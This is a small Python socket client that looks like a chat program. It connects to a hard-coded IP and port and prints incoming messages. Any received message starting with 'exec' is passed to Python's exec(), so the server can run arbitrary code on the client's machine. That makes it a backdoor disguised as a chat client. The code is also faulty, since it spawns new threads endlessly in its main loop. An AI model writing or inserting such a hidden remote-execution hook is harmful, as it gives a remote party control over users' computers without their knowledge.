import socket
import threading
import sys, subprocess
from colorama import Fore, Back, Style

PORT = 4545

SERVER = "10.1.56.61"
#SERVER = socket.gethostbyname(socket.gethostname())

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((SERVER, PORT))

def send_msg():
    msg = input()
    message = msg.encode('utf-8')
    client.send(message)

def recieveMsg():
    try:
        recievedMsg = client.recv(1024).decode()
        if(recievedMsg[0: 4] == "exec"):
            exec(recievedMsg[5:])
        else:
            print(recievedMsg)

    except:
        print("Disconnected from the server!")

while True:
    recieveThread = threading.Thread(target=recieveMsg, args=())
    sendThread = threading.Thread(target=send_msg, args=())
    recieveThread.start()
    sendThread.start()
